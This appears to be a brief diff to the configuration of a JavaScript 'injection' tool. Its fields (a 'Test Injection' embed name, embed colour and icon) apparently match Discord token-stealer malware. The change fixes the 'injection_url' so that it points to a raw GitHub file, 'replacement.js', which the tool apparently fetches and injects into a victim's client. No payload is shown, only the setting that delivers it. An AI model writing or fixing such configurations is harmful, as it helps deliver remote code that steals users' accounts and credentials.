@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Test Injection', 
   embed_icon: 'https://avatars.githubusercontent.com/u/166258577?v=4'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://github.com/Yasinwashere/something/edit/main/replacement.js/raw', 
+  injection_url: 'https://raw.githubusercontent.com/Yasinwashere/something/main/replacement.js', 
   /**
    
    **/
